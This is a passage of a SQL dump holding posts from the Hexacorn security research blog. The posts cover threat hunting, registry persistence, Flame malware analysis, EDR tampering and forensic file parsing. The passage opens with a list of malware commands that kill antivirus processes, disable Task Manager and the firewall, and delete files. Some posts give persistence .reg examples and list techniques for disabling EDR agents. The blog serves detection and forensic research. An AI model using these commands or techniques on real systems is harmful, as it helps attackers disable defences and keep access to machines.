1915 taskkill /f /im dnf.exe.manifest\r\n   1846 reg add hkcu\\software\\microsoft\\windows\\currentversion\\policies\\associations /v modriskfiletypes /t reg_sz /d .exe /f\r\n   1770 taskkill /f /im wscript.exe\r\n   1761 taskkill /f /im sys.exe\r\n   1760 taskkill /f /im tati.exe\r\n   1760 taskkill /f /im kspoold.exe /im kspool.exe\r\n   1760 taskkill /f /im ansav.exe /im ansavgd.exe\r\n   1661 cmd /c sc config sharedaccess start= disabled\r\n   1654 ipconfig /flushdns\r\n   1639 cmd /c cacls \"<file>\" /e /p everyone:f\r\n   1623 cmd /c sc delete javaserve\r\n   1619 cmd /k \r\n   1474 cmd /c del /f /s /q \"%userprofile%\\local settings\\temporary internet files\\*.*\"\r\n   1474 cmd /c del /f /s /q \"%userprofile%\\local settings\\temp\\cookies\\*.*\"\r\n   1474 cmd /c del /f /s /q \"%userprofile%\\cookies\\*.*\r\n   1474 cmd /c attrib -h -s -r -a \"%userprofile%\\local settings\\temp\\cookies\\*.*\"\r\n   1474 cmd /c attrib -h -s -r -a \"%userprofile%\\cookies\\*.*\"\r\n   1457 taskkill /f /im ksafetray.exe\r\n   1417 cmd /c taskkill /im ekrn.exe /f\r\n   1350 reg add hkcu\\software\\microsoft\\windows\\currentversion\\policies\\system /v disabletaskmgr /t reg_dword /d 1 /f\r\n   1320 reg add hkey_local_machine\\software\\microsoft\\windows\\currentversion\\policies\\explorer /v nofolderoptions /t reg_dword /d 1 /f\r\n   1294 cmd /c\r\n   1239 taskkill /f /pid \r\n   1218 cmd /c regedit /s c:\\system.reg\r\n   1099 cmd /c taskkill /im egui.exe /f\r\n   1086 cmd /c sc config avp start= disabled\r\n   1048 regsvr32 /s /u \"\r\n   1025 regsvr32  /s \r\n    985 cmd /c reg delete hkcu\\software\\microsoft\\windows\\currentversion\\r\r\n    982 taskkill /f /t /im rstray.exe\r\n    970 cmd /c echo y| cacls \r\n    928 cmd /c ping 127.0.0.1&&del \r\n    909 cmd /c sc config ekrn start= disabled\r\n    867 taskkill /f /t /im ksafetray.exe\r\n    855 taskkill /f /im knightonline.exe\r\n    828 cmd /c start \r\n    755 cmd /c reg add hkcu\\software\\microsoft\\windows\\currentversion\\run /v ctfmon /t reg_sz /d \r\n    708 cmd /c c:\\mysql.exe -u\r\n    708 cmd /c app.path & \\mysqldump.exe -u\r\n    699 cmd /c net stop mpssvc\r\n    667 cmd /c taskkill /f /im qq.exe  /t\r\n    654 taskkill /f /im rstray.exe\r\n    654 taskkill /f /im iexplore.exe\r\n    648 cmd /c sc delete ekrn\r\n    636 cmd /c taskkill /im avp.exe /f\r\n    611 cmd /c sc config \r\n    606 taskkill /f /im gbpsv.exe >nul\r\n    599 cmd /c reg add hkcu\\software\\microsoft\\windows\\currentversion\\run /v msmmsgr /t reg_sz /d \r\n    592 schtasks /create /sc onlogon /tn \":schname\" /tr \":path\"  :vista\r\n    586 cmd /c reg add hkcu\\software\\microsoft\\windows\\currentversion\\run /v \r\n    583 cmd /c del \"\r\n    564 cmd /c taskkill /im scanfrm.exe /f\r\n    560 reg add \"hklm\\software\\microsoft\\windows\\currentversion\\internet settings\" /v proxyenable /t reg_dword /d 00 /f\r\n    560 reg add \"hkcu\\software\\microsoft\\windows\\currentversion\\internet settings\" /v proxyenable /t reg_dword /d 00 /f\r\n    558 reg add hklm\\software\\microsoft\\windows\\currentversion\\explorer\\cabinetstate /f /v fullpath /t reg_dword /d 1\r\n    552 reg add \"hkcu\\software\\microsoft\\windows nt\\currentversion\\winlogon\" /v \"shell\" /t \"reg_sz\" /d \"explorer.exe,\r\n    539 regsvr32 /s mswinsck.ocx\r\n    530 cmd /c ping 127.0.0.1 -n 3 && del \"\r\n    525 cmd /c erase /f \"\nShare this :)', 'Preaching', 'http://www.hexacorn.com/blog/2016/10/16/the-threat-hunting-the-anomaly-hunting-the-data-eyeballing/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (141, 'Permanent Link to Threat Hunting – A Tale of Wishful Thinking and Willful Ignorance …', 'Hexacorn', 'October 15, 2016 ', 'I will start by saying that I am a devoted advocate for threat hunting and I consider it a must-do part of any Incident Response program.\nHowever…\nIt’s a very difficult task, and one that cannot be solved by a list of Event IDs, list of names for known bad programs, dual-purpose programs, OS commands abused by attackers, or clever regex kung-fu. I believe that the core of threat hunting relies on data reduction, and this often ends up with False Positive management. A really, really tough task. Unfortunately, most of the threat hunting ‘recipes’ that can be found online covering this topic are often focused on the True Positives; the presentations show screenshots confirming that certain events can highlight the execution of malware, etc.. Yes, this works fine. But it’s an error of availability. This works fine for a single test system, but it is much harder on a real system and completely non-scalable for a large number of systems.\nLet me illustrate it by some simple math – the number of processes started logged by the Windows Event log on my lab workstation is easily 300 per day or more (sometimes it’s a few thousands if I do some batch file processing). This often escapes our consciousness, but cmd, strings, grep, tools of any sort, it all leaves a mark in the log. Let’s say the average system has 150 processes executed every day. Multiply it by 365 days, that’s 50K+ events. Multiply it by 50K devices and you get 2,737,500,000 events. And this is just process creation. A decent EDR will log threads’ creation, writing to other processes’ memory, file creation, registry modifications, account creation, escalations of  privileges, and so on and so forth. It’s a HUGE number of events. It has a tremendous value in terms of analysis and works very well as a post-mortem detective control, but it’s not necessarily designed to prevent/detect early the badness… We can do some data reduction using data stacking, etc., but even after that the variety of programs that you will see in these logs makes the task very very difficult. This gets especially hard in the environment where you have a large group of developers – these guys run crazy number of processes, experiment with weird software on their systems (they also _write_ programs and execute them for testing), and contribute a lot to the noise in the logs. And mind you, we would like to discover the insider threat as well…\nIn general, I divide threat hunting rules into two categories:\n\nbased on IOCs\n\nthis is very easy to implement\nexamples\n\nunique_file_name.exe is bad – we can query systems for it on regular basis and if it is detected we trigger the alert\nwhen new file extension used by ransomware becomes publicly known, we can query the logs for file creation events that hit on this new file extension\n\n\nthe ROI is poor though, because it’s a signature-based approach\n… and yeah, unfortunately looking for specific process names often leads to False Positives as well…\n\n\nbased on assumptions and scenarios that attempt to detect stages of malicious/hacking activity (aiming at disturbing the kill chain)\n\nthis is difficult as the expected results are not known and lots of tuning is required to reduce the data returned by the query\nthe following rule sounds like a good example of this idea: ‘svchost.exe executed from a non-sysdir location’\n\nI think this rule is extremely powerful, cuz it will catch any malware that drops and executes svchost.exe f.ex. from %appdata%\nthere is only one problem… it is a signature-based approach! and while it highlights an anomaly, it only covers a small part of the spectrum…\n\n\nhold on… so what could be a real example of rule belonging to this category? what about ‘review all executable files dropped in the %appdata%’?\n\nthis is better, but how do you distinguish which dropped file is executable? it’s difficult even if we talk about file extensions only, as one could use ‘.exe’, ‘.dll’, ‘.scr’, ‘.pif’, but also ‘.foo’, ‘.dat’, and ‘.rar’, or ‘.zip’ – as long as one can load the file and execute it, the file extension doesn’t matter; and let’s not forget about the file content (PE file, scripting languages, macros) and… last but not least – yup, this is yet another signature-based rule!\n\n\nokay, so what about this ‘look at all files dropped inside %appdata%’…\n\nyeah, right…\n\n\nhmm what about hackers using ‘ipconfig.exe’, ‘netstat.exe’, ‘net.exe’, ‘cscript.exe’, etc.? or even ‘psexec.exe’, ‘nmap.exe’ ?\n\ngood luck with that…\nobviously, it’s signature-based approach as well, but even if we forget about it (it’s a very precise rule and these tools are used by hackers after all) – all of these are so frequently used by both users and embedded in many ‘enterprise’ solutions (some EDR solutions rely heavily on external hacking programs too!) – it’s impossible to sift through it\n\n\nI guess there is no way to avoid some sort of hard coded values here (yup, signatures!)\nA good example would be – show me all processes that use a single-double character as a name; this is hardcoded, but exploits the fact it’s an anomaly and hackers often use such files on the systems (and since I mentioned False Positives management – hello cywgin’s [.exe, ar.exe, as.exe, cp.exe, dd.exe, df.exe, du.exe, id.exe, ld.exe, ln.exe, ls.exe, mv.exe, nl.exe, nm.exe, od.exe, pg.exe, pr.exe, ps.exe, rm.exe, sh.exe, tr.exe, ul.exe, vi.exe, w.exe, wc.exe, xz.exe… and it’s just a tip of the iceberg in a corp. environment)\nIn some cases histograms, or some clever statistics backed by exclusions and some arbitrary values (signatures again!) can do the trick f.ex. ‘show me all uploads higher than xyz bytes in last 1h’\n…\n\n\n\nThreat hunting is anomaly hunting and defining an anomaly is extremely difficult, but we are getting better at it. The thing I want to highlight with this post is that the current state of threat hunting is that we finally know what to log and what to look at. We have absolutely no clue though how to sift through this data in a realistic, scaleable way to ensure we don’t miss a single threat. This is the very same problem security industry tries to solve for a very long time. Let’s not pretend that we did.\nShare this :)', 'Preaching', 'http://www.hexacorn.com/blog/2016/10/15/threat-hunting-a-tale-of-wishful-thinking-and-willful-ignorance/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (142, 'Permanent Link to The cyberchild of Omelas', 'Hexacorn', 'October 14, 2016 ', 'With the explosion of everything that can be seen as a ‘cyber as a service’ – the hot potato that everyone loves to talk about, but no that many have much idea of – we have witnessed a rapid, almost instant transformation of the industry that was once quite specialized and yes – technical – into a non-sense that it is today. The non-sense that is repeating all the not-so-humble steps of its many predecessors (firewall, IDS, honeypot, etc.).\nThe hippie, Woodstock atmosphere is still on and it feels great… except it is not. The good news is – the end users are not that dumb anymore. Or, at least we can hope so… Well, let’s try to make the world a better place… In this short post I will describe the real-case examples of idiocy that I see in this space. Sometimes it’s frustrating, sometimes it’s a great source of joy… Oh well… such is life. I guess I must emphasize that this is not to whine about it, but to warn the end-users and future customers of what they should be aware of when signing up multi-million deals for that next big thing…\n\nThe antivirus industry spent a crazy amount of time developing the cure for malware; they went through all the paths that today’s ‘next-gen’ software and IR researchers go through:\n\nStatic Signatures\nBehavioral signatures\nStatistics\nArtificial intelligence\nReputation\nHeuristics\nPredictive analysis\nAnd so on and so forth, you name it…\nRule #1: if someone tells you their software will protect your company better than antivirus – s/he is lying\n\nBonus:\n\nIf you get high about AI, yara signatures, searching for the IOCs, and even threat hunting – then you are like that South Park episode – Simpsons already did it – like 20-30 years ago\nUpdate: see a quick addendum post\n\n\n\n\n\n\nDoing the manual, old-school forensic analysis of the system teaches you one significant and humble lesson- you can automate certain tasks, but at the end of the day – it’s  a tough, mundane, and boring job to go through the whole evidence… if not for finding the smoking gun, then at least to _conclusively_ exclude all the other possibilities; if you screw it up, the court, the customer, the other (competitive) forensic company will expose you as a liar, fraud, and a mediocre analyst\n\nRule #2: if someone tells you their software will do IR/forensic work for you in an automatic fashion – s/he is lying\n\n\nWorking in a consulting environment is a highly stressful, but also rewarding exercise – it teaches you a lesson that you are not as good as you think you are, it also tells you that there is NO 2 systems from different customers that would look alike.\n\nRule #3: if someone tells you their software is customized, tailored, and totally adapted to your env. – s/he is lying\n\n\nIf you ever worked in SOC, or a similar function, you know that blocking stuff on the proxy is a tricky business; you have more than one proxy server; you have some legacy servers no one knows about; you have some rules and exclusions, and so on and so forth\n\nRule #4: if someone tells you their software is preventing/detecting all the network badness  – s/he is lying\n\n\nThe manual maintenance of many records is tiring; hence, this is a reason why using databases is so tempting and convenient. Open your mobile phone, and walk through all the phone numbers you called last year; there are some calls that at that particular time were incredibly important, now you don’t even know what they were all about….\n\nRule #5: if someone tells you their rules are properly categorized and prioritized  – s/he is lying\n\nThe maintenance costs of keeping the sigs/rules relevant is incredible and is very environment-oriented (check your vendor’s classification for: Code Red, ILOVEYOU virus, Slammer, or any ms06-xxx…)\n\n\n\n\nThe Threat Hunting is fashionable as hell; everyone is happily presenting about it, but reality is that it doesn’t work the way it is prescribed\n\nThe users do insane things that break your awesome threat hunting rules\nThe software is doing insane things that break your awesome threat hunting rules\nThe dual-purpose tools that are definitely, undeniably 100% malicious and indicate a hacker on the box – just one of the support guys running their ‘gather info about user’s box’ script on the system\nThe incredible as it sounds 1000 instances of cmd.exe spawn on the system, a number of visual basic script interpreters executed in just 30 minutes – oh, it’s just that new shiny EDR solution doing its thing\nThe guy running netstat, ping, and ipconfig – you can either send the S.W.A.T team, or conclude it’s just an admin trying to connect back to the system that went down\nThe Windows Event Logs that are threat-hunter’s wet dreams because they are so often logged, stored and can be queried… oh, except that all these scheduled tasks, ‘runas’ commands, new accounts created, and someone banging on the shared folders with wrong credentials for 12876 days … it’s actually thousands of events that are NOTHING BUT A NOISE\nThis bullet point can go forever, I can assure you  I am listing only a few things at the top of my head, but it’s just a non-sense\nRule #6: if someone tells you their feeds, rules detects malicious hackers using sophisticated rules based on the attacker’s behavior  – s/he is lying\nUpdate: see a follow-up post about Threat Hunting bubble\n\n\n\nYup… the cyber child of Omelas is there to keep us all happy.\nTo write about a problem is just half of the story.\nWhat could be the solution?\nWe can’t count on honesty of vendors. It’s not technical people selling this stuff. (Update: I stand corrected; I also need to mention ThreatGrid as one of the vendors that blew my mind in the past; not humble to say, but it’s a pleasure to speak to people who obviously know more than me)\nWhat we need is a point of reference. The crowd-sourced, unbiased (as much as it can be) view on solutions in the ‘cyber’ space. It has to be anonymous, but brutally honest. If the thing is a snake oil, then it should be exposed. The EDR sheet is a good example, but we can do better.\nShare this :)', 'Preaching', 'http://www.hexacorn.com/blog/2016/10/14/the-cyberchild-of-omelas/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (143, 'Permanent Link to Beyond good ol’ Run key, Part 47', 'Hexacorn', 'September 29, 2016 ', 'The persistence mechanism that I am going to describe today is not for the faint-hearted.\nWhen Windows 10 starts, lsass.exe loads Authentication Packages (AP) from the following registry location:\n\nHKLM\\SOFTWARE\\Microsoft\\IdentityStore\\Providers\n\nThe location contains a number of subkeys that use GUID-based naming convention. The default ones are:\n\n{B16898C6-A148-4967-9171-64D755DA8520}\n\nApPluginDLLPath=aadcloudap.dll\n\n\n{D7F9888F-E3FC-49B0-9EA6-A85B5F392A4F}\n\nApPluginDLLPath=MicrosoftAccountCloudAP.dll\n\n\n\nIt’s tempting to add your own f.ex.\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\IdentityStore\\Providers\\{00000000-0000-0000-0000-000000000000}]\r\n\"ApPluginDLLPath\"=\"c:\\\\WINDOWS\\\\system32\\\\test_client.dll\"\r\n\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\IdentityStore\\Providers\\{00000000-0000-0000-0000-000000000000}\\LoadParameters]\r\n\"Enabled\"=dword:00000001\nThe LoadParameters key must contain the Enabled value name – this ensures the DLL is loaded.\nHowever…. there is a little problem (yet it’s one that is good to have!) – the Microsoft developers had a foresight here and made it quite difficult for anyone to abuse these keys.\nWhy?\nThe DLLs are loaded using LoadLibraryEx with the LOAD_LIBRARY_SEARCH_SYSTEM32 and  LOAD_LIBRARY_REQUIRE_SIGNED_TARGET options on.\n\nThis means that the DLL must be placed inside the c:\\windows\\system32 directory (LOAD_LIBRARY_SEARCH_SYSTEM32).\nSecondly, the DLL loaded from this location must be signed.\nThirdly, the DLL not only must be signed, but also compiled with the /INTEGRITYCHECK option on. This ensures that the Kernel-Mode Code Signing (KMCS) checks are enforced.\n\nFinally, the Registry key is owned by Trustedinstaller. One needs to change the owner to modify the access rights and grant the permissions to add/modify the keys.\nPractical aspects of it mean that it’s relatively hard to test it (I may describe how to do it later).\nHere’s an example from the test system:\n\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2016/09/29/beyond-good-ol-run-key-part-47/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (144, 'Permanent Link to Old Flame Never Dies (a.k.a. decompiling LUA)', 'Hexacorn', 'September 26, 2016 ', 'When the news about Flame exploded all over the media, I remember grabbing available samples and like many other researchers started poking around. Pretty quickly, I extracted a large number of very unique strings from various Flame samples and posted them online.\nRecently, I accidentally came across that old post and started wondering if anyone ever posted the decompiled Lua scripts for the malware. I googled around for some of the strings I posted on my blog back then and to my surprise – my blog was the only one showing up!\nI guess there must be some conspiracy theory that will explain that…\nBack in 2012, I didn’t have all the samples, but I did run them through a quick analysis process which I will describe below. The procedure for obtaining the strings was extremely crude, but like many quick&dirty solutions – it worked pretty well (and it was fast!).\n\nFor each DLL, load it via rundll32\n\nFor each exported function, execute it\n\nFor ever every single execution, delay for some time\nGrab memory dumps for rundll32\nKill rundll32\n\n\n\n\n\nInterestingly, I still have the memory dumps I used to extract the strings from, so… since I suddenly thought of these Lua scripts I re-used the memdumps to extract over 60 Lua bytecoded scripts (from both static files and memory dumps to be precise).\nAnd here comes the real purpose of the thread – document how to obtain decompiled Lua scripts from Flame:\n\nI wrote a quick carving tool in perl to extract Lua bytecode from both static files, and memory dumps\n\nThis was pretty easy, since the compiled Lua always starts with a header “\\x1BLua”\nFor each extracted file, I wrote another quick&dirty script to rename it to the name embedded inside the bytecoded Lua script\nThat’s how we get the ‘original’ name of the files f.ex. ‘MUNCH_ATTACKED_ACTION.lua’ is embedded inside the bytecoded Lua script\n\n\n\n\n\nWith all the files preprocessed, I ran them through a Lua decompiler\n\nFor many files, it worked like a charm; for some, it failed\n\n\n\nIf you remember Kaspersky’s Flame code from 2012:\n\nyou can find the code inside the flame_props.lua.dec file (you need to remove decompiler’s comments):\n\nThe collection of all decompiled scripts can be found here.\nThe password is: old_flame_never_dies\nList of all scripts:\n\n___kaspersky.dec\nattackop_base_prods.lua.dec\nattackop_base_sendfile.lua.dec\nATTACKOP_FLAME.lua.dec\nATTACKOP_FLAME_PRODS.lua.dec\nATTACKOP_FLAME_STARTLEAK.lua.dec\nATTACKOP_FLASK.lua.dec\nATTACKOP_FLASK_PRODS.lua.dec\nATTACKOP_JIMMY.lua.dec\nATTACKOP_JIMMY_PRODS.lua.dec\nATTACKOP_MOVEFILE.lua.dec\nATTACKOP_RUNDLL.lua.dec\nbasic_info_app.lua.dec\ncasafety.lua.dec\nclan_entities.lua.dec\nclan_seclog.lua.dec\nCRUISE_CRED.lua.dec\neuphoria_app.lua.dec\nevent_writer.lua.dec\nfio.lua.dec\nflame_props.lua.dec\nget_cmd_app.lua.dec\nIMMED_ATTACK_ACTION.lua.dec\njson.lua.dec\nleak_app.lua.dec\nlibclanattack.lua.dec\nlibclandb.lua.dec\nlibcommon.lua.dec\nlibdb.lua.dec\nlibflamebackdoor.lua.dec\nliblog.lua.dec\nlibmmio.lua.dec\nlibmmstr.lua.dec\nlibnetutils.lua.dec\nlibplugins.lua.dec\nlibwmi.lua.dec\nmain_app.lua.dec\nMUNCH_ATTACKED_ACTION.lua.dec\nMUNCH_SHOULD_ATTACK.lua.dec\nNETVIEW_HANDLER.lua.dec\nNETVIEW_SPOTTER.lua.dec\npayload_logger.lua.dec\npost_cmd_app.lua.dec\nREG_SAFETY.lua.dec\nRESCH_EXEC.lua.dec\nrts_common.lua.dec\nSECLOG_HANDLER.lua.dec\nSECLOG_SPOTTER.lua.dec\nSNACK_BROWSER_HANDLER.lua.dec\nSNACK_ENTITY_ACTION.lua.dec\nSNACK_NBNS_HANDLER.lua.dec\nSTD.lua.dec\nstorage_manager.lua.dec\nSUCCESS_FLAME.lua.dec\nSUCCESS_FLAME_STARTLEAK.lua.dec\nSUCCESS_GET_PRODS.lua.dec\ntable_ext.lua.dec\ntransport_nu_base.lua.dec\nTRANSPORT_NU_DUSER.lua.dec\nTRANSPORT_NUSYSTEM.lua.dec\nUSERPASS_CRED.lua.dec\nWMI_EXEC.lua.dec\nWMI_SAFETY.lua.dec\n\nShare this :)', 'Batch Analysis, File Formats ZOO, Malware Analysis, Reversing', 'http://www.hexacorn.com/blog/2016/09/26/old-flame-never-dies-a-k-a-decompiling-lua/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (145, 'Permanent Link to Beyond good ol’ Run key, Part 46', 'Hexacorn', 'September 24, 2016 ', 'A persistent mechanism that requires a user interaction is probably deemed to fail, but there is still some potential here (I described some functionality like this before) and that’s why I am going to talk about yet another little trick like this here…\nEvery once in a while Windows needs to tell the user about something important. The standard way to do it is through these annoying balloons at the bottom of the tray’s area (or system area, or whatever they call it nowadays – this changes all the time). One of the first examples of such ‘important’ notification was the Tour in Windows XP. Anytime you install XP from the scratch, or add a new user and that user logs on, the annoying balloon immediately shows up:\nThe balloons like this are created using the IUserNotification interface. Clicking the ‘cloud’ area executes a program that is associated with the balloon. And this this is the interactivity part I mentioned. The user needs to click the thing to launch the application associated with the message.\nNow that we know how the interactive part works, let’s explore the persistence bit.\nWindows uses a mechanism called PostBootReminder to preserve a list of important notifications that system will show after the reboot. The name is misleading as these notifications are user-related and stored in the user’s Registry hive. So it’s not really Post Boot, but when Shell is loaded. One just needs to log off and log on again and the thingie will trigger.\nAdding PostBootReminder entries is relatively easy. The below reg file is a simple example of such notification:\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\PostBootReminders\\Malware]\r\n\"Title\"=\"Malwaretest\"\r\n\"Text\"=\"Yet another lame persistence mechanism-wannabe...\"\r\n\"ToolTip\"=\"Hello World!\"\r\n\"ShellExecute\"=\"c:\\\\windows\\\\system32\\\\calc.exe\"\r\n\"IconResource\"=\"%SystemRoot%\\\\\\\\system32\\\\\\\\shell32.dll,-16783\"\r\n\"ShowTime\"=dword:00803600\r\n\"RetryInterval\"=dword:0000060\r\n\"RetryCount\"=dword:00000060\r\n\"TypeFlags\"=dword:00000000\nAs we can see, the entries are stored under the HKCU key:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\PostBootReminders\\<name>\n\nOnce the system reads and creates the notification, it deletes the entry. So, in some way it works like a RunOnce key.\nThe Tour application that is being executed by Windows XP is scheduled the same way, except it is added not prior to reboot/log off, but when Windows Explorer starts. There is a Registry entry:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\Tour\\RunCount\n\nthat dictates whether the Tour app will get scheduled via PostBootReminders mechanism.\nThis is obviously a bit of an archaeologic trivia, but I can mention that the name of that PostBootReminders entry is ‘Microsoft.OfferTour’. Of course, being clever reader as you are, you will surely notice that the Tour Registry key, together with a replacement of the Tour program executable (tourstart.exe) could work as a nice persistence mechanism as well (back when replacing files in system32 was easier).\nAnother trivia to add: there is one more fake PostBootReminders  entry added by Windows Explorer on Windows XP. It is called ‘Microsoft.FixScreenResolution’\n\nand is supposed to help fixing the screen resolution. This entry is controlled by the following Registry key:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\DontShowMeThisDialogAgain\\ScreenCheck\n\nThe conditions when it is launched are a bit more complex than just a presence/value of the Registry entry and are described in detail here.\nGoing back to the future – Windows 10 continues to use the very same mechanism. The known PostBootReminders  entries include:\n\nMicrosoft.AuditingLogIsFull\nMicrosoft.CachedLogon\nMicrosoft.KerbCredentialsExpired\nMicrosoft.LogoffWarning\nMicrosoft.LogonHoursWarning\nMicrosoft.NetDriveReconnectFailed\nMicrosoft.PasswordExpiryWarning\nMicrosoft.SmartCardUnlockRequired\nMicrosoft.SubscriberFailed\nProfileError\n\nGoing back to the .reg example I posted above – the arguments of the PostBootReminders subkey are passed directly to methods of IUserNotification interface, so their explanation can be easily found by exploring the Microsoft site: Title, Text and TypeFlags, RetryInterval, RetryCount, ShowTime, IconResource, ToolTip. The ShellExecute is just a path to the executable. It is worth mentioning that there is also one more entry that can be added – CLSID – this represents the GUID of the class that will be instantiated if present, but I have not explored it yet and not sure how it works.\nAs I mentioned, I doubt this thing can fly, but who knows… one could annoy the user, by making the message never go away (hint: RetryCount/RetryInterval), until clicked – same as on the animation below  [you may need to click to watch]\n \n\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2016/09/24/beyond-good-ol-run-key-part-46/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (146, 'Permanent Link to rEDRoviruses – Whether you’re a AV or whether you’re a EDR, You’re stayin’ alive, ', 'Hexacorn', 'September 19, 2016 ', 'EDR software is so hot right now. While AV is mainly focused on badness and silent detections/reputation analysis, the EDR solutions log everything. Sooner or later this ‘everything’ will cause trouble to bad guys and they will act on it. Interestingly, while killing AV doesn’t make that much sense (because it’s so afraid of triggering FPs), the nature and immaturity of EDR (and associated with it an omnipresent problem of dead agents) makes it actually a very easy target…\nSuch kill-EDR, or at least anti-EDR , or perhaps even just detect-EDR (which already exists) techniques are also important to offensive teams that will surely want to know about the EDR presence and … will try their best to bypass/avoid it…\nIt’s also important to remember that discussion of anti-EDR is very important for another reason. Most of AV is using anti-tampering technologies that prevent AV from being well… tampered with. EDR should follow these steps closely – otherwise, well… they will be tampered with too. And fundamentally, the more protection and attention is given to the security of EDR – the better. Think of the Project Zero blog that excels in killing bugs in a variety of software ranges – I don’t see any reason why they shouldn’t give it a try with EDR software…\nThe following is a bunch of ideas that EDR vendors should look into to protect themselves against being shut down:\n\nBlocking via Software Restriction Policies\nBlocking via AppLocker\nBlocking via Image File Execution Options\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\n\n\nStopping or blocking WMI\n\nMany agentless solutions relying on WMI may stop working\n\n\nDisabling Windows Script Host (and VBS/JS) f.ex. via\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows Script Host\\Settings\\Enabled\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows Script Host\\Settings\\Enabled\n\nsolutions using visual basic script will stop working – EDR relying on such a single Registry setting needs to ensure this setting is restored prior to execution of every script\n\n\n\n\nDisabling the Powershell\nChanging ACLs to directories/Registry entries\n\nPotentially preventing log writing, config updates, etc.\n\n\nModification of hosts files\n\nSame old, same old…\n\n\nStopping/disabling services\n\nI won’t list service names, but they are easy to find\n\n\nAnalysis of kernel drivers of EDR solutions may help in finding new ways to escalate privileges\n…\n\nShare this :)', 'Anti-*, EDR', 'http://www.hexacorn.com/blog/2016/09/19/redroviruses-whether-youre-a-av-or-whether-youre-a-edr-youre-stayin-alive-stayin-alive/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (147, 'Permanent Link to DeXRAY 1.7 – ccSubSdk files – part 2', 'Hexacorn', 'September 18, 2016 ', 'I have added a buggy routine that attempts to interpret the content of the decrypted ccSubSdk files; this is based purely on looking at the file properties – at first I noticed that there are many GUID-like values that appear in the files many times and across many files. Then looking at the layout I tried to split the data by using these GUIDs as dividers – this was helpful and led to a better understanding of how these chunks are structured. Some patterns started emerging and in the end the serialization character of the file layout became more apparent. Walking through trial-and-error I put together a raw parser that attempts to make a better sense of the data records.\nThe tool stores the hexadecimal dumps of the interpreted data in .met files that are now accompanying all decrypted out files for both submission.idx and actual submission files. You will find errors in some of the output files, but atm it’s the best it can do. Work in progress \nThe output is tagged using  ‘###’ f.ex.:\n### GUID\r\n      21 A3 05 3F B7 43 78 45 93 C8 CD C5 F6 4A 14 9A  !..?.CxE.....J..\r\n09\r\n      22 00 00 00                                      \"...\r\n\r\n06\r\n      01 00 00 00                                      ....\r\n\r\n06\r\n      01 00 00 00                                      ....\r\n\r\n07\r\n      13 00 00 00                                      ....\r\n\r\n      4D 72 43 6C 65 61 6E 20 53 75 62 6D 69 73 73 69  MrClean Submissi\r\n      6F 6E 00                                         on.\r\n\r\n### STRING-A\r\n      MrClean Submission\nThe following identifiers are now being used:\n\nSTRING-A – String ANSI\nSTRING-W – String Wide (Unicode-16LE)\nBLOB – binary blob\nGUID – 16 bytes long GUID-like data\n\nThe latest version of DeXRAY can be found here.\nShare this :)', 'Batch Analysis, Compromise Detection, DeXRAY, File Formats ZOO, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2016/09/18/dexray-1-7-ccsubsdk-files-part-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (148, 'Permanent Link to DeXRAY 1.6 – ccSubSdk files', 'Hexacorn', 'September 15, 2016 ', 'Yesterday Brian Baskin pinged me on Twitter asking about ccSubSdk files that Symantec solutions store on the system in the following location:\n\nC:\\ProgramData\\Norton\\{0C55C096-0F1D-4F28-AAA2-85EF591126E7}\\<product>\\CmnClnt\\ccSubSDK\n\nf.ex.\n\nC:\\ProgramData\\Norton\\{0C55C096-0F1D-4F28-AAA2-85EF591126E7}\\NIS_21.5.0.19\\CmnClnt\\ccSubSDK\n\nThe SEP may store similar files in different location:\n\nC:\\ProgramData\\Symantec\\Symantec Endpoint Protection\\<SEP version>\\Data\\CmnClnt\\ccSubSDK\nC:\\ProgramData\\Symantec\\Common Client\\ccSubSDK\nC:\\Documents and Settings\\All Users\\Application Data\\Symantec\\Symantec Endpoint Protection\\<SEP version>\\Data\\CmnClnt\\ccSubSDK\n\nDeXRAY didn’t support them and it triggered my interest. I pretty quickly identified the algorithm as Blowfish, but for some reason it didn’t work. Eventually, after struggling with it for a while I ended up understanding the issue: it was a problem of little vs. big endianess – unfortunately, the same algorithms can be implemented to work with different data -ness.\nOnce I figured it out, I added a basic support for both {GUID} files and the submissions.idx. Now, when I say ‘support’ I mean the decryption of the outer layer only and a basic interpretation of what I can deduct from the file structure inside submissions.idx. Once you look at the decrypted files you will realize that the files contain some sort of container to store a lot of information about the suspected files / network data and possibly other data sets sent to the AV Reputation engines + actual files. On top of that, in some instances the content of the files is not encrypted (with a second layer), and in some it is.\nIt’s quite a headache.\nStill, it’s worth pursuing further as it seems to be a great forensic artifact that may help to identify a lot of file-system and network activities that may not be recorded anywhere else, or long forgotten. We can retrieve metadata and the content of long lost files. And since the reputation engine intercepts pretty much all unknown suspicious files, as well as some network artifacts a lucky forensic investigator may actually find a smoking gun there…\nHere are a few examples:\n\nA suspicious file 